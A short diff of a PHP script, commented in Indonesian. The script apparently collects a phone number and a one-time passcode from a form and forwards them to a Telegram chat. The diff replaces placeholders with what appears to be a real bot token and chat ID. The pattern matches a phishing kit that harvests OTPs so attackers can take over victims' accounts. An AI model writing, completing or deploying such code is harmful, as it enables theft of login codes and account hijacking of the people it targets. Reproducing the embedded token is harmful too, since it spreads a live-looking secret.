@@ -8,8 +8,8 @@ if (isset($data['phone']) && isset($data['code'])) {
     $code = $data['code'];
 
     // Token dan chat_id bot Telegram
-    $bot_token = 'YOUR_TELEGRAM_BOT_TOKEN';
-    $chat_id = 'YOUR_CHAT_ID';
+    $bot_token = '7451357338:AAGaHAyD96AMy2WVLgSbfQi0ovel3Y31IWk';
+    $chat_id = '6269902580';
 
     // Format pesan untuk dikirim ke Telegram
     $message = "Nomor: $phone\nOtp: $code";
